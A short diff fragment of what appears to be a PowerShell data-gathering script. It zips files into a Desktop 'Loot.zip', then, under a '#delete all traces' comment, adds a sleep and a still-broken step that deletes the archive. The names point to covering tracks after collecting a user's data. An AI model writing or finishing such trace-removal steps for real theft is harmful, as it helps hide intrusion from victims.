@@ -13,7 +13,10 @@ Compress-Archive @compress
 
 #delete all traces
 
-#delte created archive
+#delay
+Start-Sleep -Seconds 4
+
+#delete created archive [DOES NOT WORK YET]
 Remove-Item $env:USERPROFILE + "\Desktop\Loot.zip"
 
 #temp folder
